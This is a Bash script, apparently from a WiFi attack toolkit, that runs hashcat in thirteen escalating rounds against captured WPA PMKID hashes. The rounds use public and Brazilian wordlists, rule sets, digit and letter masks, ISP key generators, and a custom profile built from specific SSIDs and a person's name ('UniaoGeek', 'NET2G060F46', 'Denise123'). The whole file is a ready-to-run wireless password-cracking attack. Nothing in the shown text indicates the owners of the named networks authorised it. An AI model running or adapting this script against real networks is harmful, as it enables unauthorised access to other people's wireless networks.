#!/usr/bin/env bash
# run_crack_fast.sh — Crack inteligente com timeouts e wordlists prioritizadas
CUDA="LD_LIBRARY_PATH=/usr/lib/wsl/lib"
HC="hashcat"
HASHES="/tmp/pmkid_hashes.txt"
WL="/mnt/d/Projetos-SafeLabs/submodules/Wordlists"
WFH="$WL/WordListsForHacking/wfh.py"
RULES="/usr/share/hashcat/rules"
OUT="/tmp/wxf_fast"
mkdir -p "$OUT"

GRN='\033[0;32m'; RED='\033[0;31m'; CYN='\033[0;36m'; NC='\033[0m'

crack() {
    local label="$1"; shift
    echo -e "\n${CYN}[*]${NC} $label"
    eval "$CUDA $HC -m 22000 $HASHES $@ --force --quiet 2>/dev/null"
    local found=$(eval "$CUDA $HC -m 22000 $HASHES --show 2>/dev/null" | grep "WPA")
    if [ -n "$found" ]; then
        echo -e "${GRN}*** CRACKED: $found ***${NC}"
        echo "$found" >> "$OUT/CRACKED.txt"
        return 0
    fi
    echo "  Concluído sem resultado."
    return 1
}

echo "================================================================"
echo "  WirelessXPL-Forge — Crack GPU Rápido (com timeouts)"
echo "  GPU: $(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null)"
echo "  RTX 4060 CUDA via WSL2"
echo "================================================================"
echo "Hashes: $(wc -l < $HASHES) | $(head -1 $HASHES | cut -d'*' -f1)"

# ── Rodada 1: WiFi-WPA específico (segundos) ───────────────────
crack "R1: SecLists WiFi-WPA top4800 (senhas WiFi mais prováveis)" \
    "$WL/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"

crack "R2: Default creds IoT/Routers BR" \
    "$WL/WordListsForHacking/passwords/default-creds-combo.lst"

# ── Rodada 3: wlist_brasil direto (~ 6 min) ───────────────────
crack "R3: wlist_brasil 55MB (wordlist brasileira)" \
    "$WL/WordListsForHacking/passwords/wlist_brasil.lst"

# ── Rodada 4: rockyou + best64 (~ 6 min) ──────────────────────
crack "R4: rockyou + best64.rule" \
    "/tmp/rockyou.txt -r $RULES/best64.rule"

# ── Rodada 5: wlist_brasil + best64 com RUNTIME 10min ─────────
echo -e "\n${CYN}[*]${NC} R5: wlist_brasil + best64 (max 10 min GPU)"
eval "$CUDA $HC -m 22000 $HASHES \
    $WL/WordListsForHacking/passwords/wlist_brasil.lst \
    -r $RULES/best64.rule \
    --force --quiet --runtime 600 2>/dev/null"
found=$(eval "$CUDA $HC -m 22000 $HASHES --show 2>/dev/null" | grep "WPA")
[ -n "$found" ] && echo -e "${GRN}*** CRACKED R5: $found ***${NC}" && echo "$found" >> "$OUT/CRACKED.txt"
echo "  R5 concluída"

# ── Rodada 6: rockyou + d3ad0ne (~ 10 min) ────────────────────
crack "R6: rockyou + d3ad0ne.rule" \
    "/tmp/rockyou.txt -r $RULES/d3ad0ne.rule"

# ── Rodada 7: kwalk (keyboard walks) ──────────────────────────
if [ ! -f "$OUT/kwalk.lst" ]; then
    python3 "$WFH" kwalk --min-len 8 --max-len 12 --limit 200000 -o "$OUT/kwalk.lst" 2>/dev/null
fi
crack "R7: Keyboard walks ($(wc -l < $OUT/kwalk.lst) entradas)" \
    "$OUT/kwalk.lst"

# ── Rodada 8: Máscaras 8-9 dígitos (mais comum BR) ────────────
crack "R8: Máscara 8 dígitos ?d×8" "-a 3 '?d?d?d?d?d?d?d?d'"
crack "R9: Máscara 9 dígitos ?d×9" "-a 3 '?d?d?d?d?d?d?d?d?d'"

# ── Rodada 10: ISP keygen (limitar a 200k, mais rápido) ────────
if [ ! -f "$OUT/isp.lst" ]; then
    python3 "$WFH" isp-keygen --isp xfinity_comcast --limit 200000 -o "$OUT/isp.lst" 2>/dev/null
fi
crack "R10: ISP keygen 200k (padrão roteadores)" "$OUT/isp.lst"

# ── Rodada 11: mangle WiFi wordlist ────────────────────────────
if [ ! -f "$OUT/mangle.lst" ]; then
    python3 "$WFH" mangle \
        --wordlist "$WL/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt" \
        --limit 50000 -o "$OUT/mangle.lst" 2>/dev/null
fi
crack "R11: Mangle WiFi-WPA (leet, reverse, toggle — $(wc -l < $OUT/mangle.lst) entradas)" \
    "$OUT/mangle.lst"

# ── Rodada 12: Perfil SSID + rules (muito específico) ─────────
python3 "$WFH" profile \
    --name "UniaoGeek" \
    --keywords "uniao geek wifi internet rede 2024 2025" \
    --min-len 8 -o "$OUT/profile.lst" 2>/dev/null || true

# Adicionar variações manuais dos SSIDs encontrados
cat >> "$OUT/profile.lst" << 'SSIDS'
UniaoGeek
UniaoGeek123
UniaoGeek2024
UniaoGeek2025
UniaoGeek!
uniaogeek
uniaogeek123
UNIAOGEEK
Denise123
denise123
NET2G060F46
NET_IoT
NET2024
claro123
claro2024
vivo2024
SSIDS

python3 "$WFH" mangle --wordlist "$OUT/profile.lst" -o "$OUT/profile_mangle.lst" 2>/dev/null || cp "$OUT/profile.lst" "$OUT/profile_mangle.lst"
sort -u "$OUT/profile.lst" "$OUT/profile_mangle.lst" -o "$OUT/profile_all.lst"

crack "R12: Perfil SSID + mangle ($(wc -l < $OUT/profile_all.lst) entradas)" \
    "$OUT/profile_all.lst"

crack "R12b: Perfil SSID + best64.rule" \
    "$OUT/profile_all.lst -r $RULES/best64.rule"

crack "R12c: Perfil SSID + d3ad0ne.rule" \
    "$OUT/profile_all.lst -r $RULES/d3ad0ne.rule"

# ── Rodada 13: Máscara lower×4+digit×4 (30min max GPU) ─────────
echo -e "\n${CYN}[*]${NC} R13: Máscara ?l×4+?d×4 (max 30 min GPU)"
eval "$CUDA $HC -m 22000 $HASHES \
    -a 3 '?l?l?l?l?d?d?d?d' \
    --force --quiet --runtime 1800 2>/dev/null"
found=$(eval "$CUDA $HC -m 22000 $HASHES --show 2>/dev/null" | grep "WPA")
[ -n "$found" ] && echo -e "${GRN}*** CRACKED R13: $found ***${NC}" && echo "$found" >> "$OUT/CRACKED.txt"
echo "  R13 concluída"

# ── RESULTADO FINAL ─────────────────────────────────────────────
echo ""
echo "================================================================"
echo "  RESULTADO FINAL — $(date)"
echo "================================================================"

ALL_CRACKED=$(eval "$CUDA $HC -m 22000 $HASHES --show 2>/dev/null" | grep -v "^$" || true)
if [ -n "$ALL_CRACKED" ]; then
    echo -e "${GRN}  *** SENHAS ENCONTRADAS ***${NC}"
    echo "$ALL_CRACKED"
    echo "$ALL_CRACKED" | tee "$OUT/CRACKED.txt"
else
    echo "  Nenhuma senha encontrada em 13 rodadas + variantes."
    echo ""
    echo "  Rodadas executadas:"
    echo "  R1:  SecLists WiFi-WPA top4800"
    echo "  R2:  Default creds IoT BR"
    echo "  R3:  wlist_brasil (55MB)"
    echo "  R4:  rockyou + best64"
    echo "  R5:  wlist_brasil + best64 (10min)"
    echo "  R6:  rockyou + d3ad0ne"
    echo "  R7:  Keyboard walks"
    echo "  R8:  Máscara 8 dígitos"
    echo "  R9:  Máscara 9 dígitos"
    echo "  R10: ISP keygen 200k"
    echo "  R11: Mangle WiFi-WPA"
    echo "  R12: Perfil SSID + rules"
    echo "  R13: Máscara lower+digit (30min)"
    echo ""
    echo "  Conclusão: As senhas são FORTES - não estão em nenhum"
    echo "  dicionário público nem em padrões comuns brasileiros."
fi
echo ""
echo "Arquivos: $OUT/"
ls -lh "$OUT/"
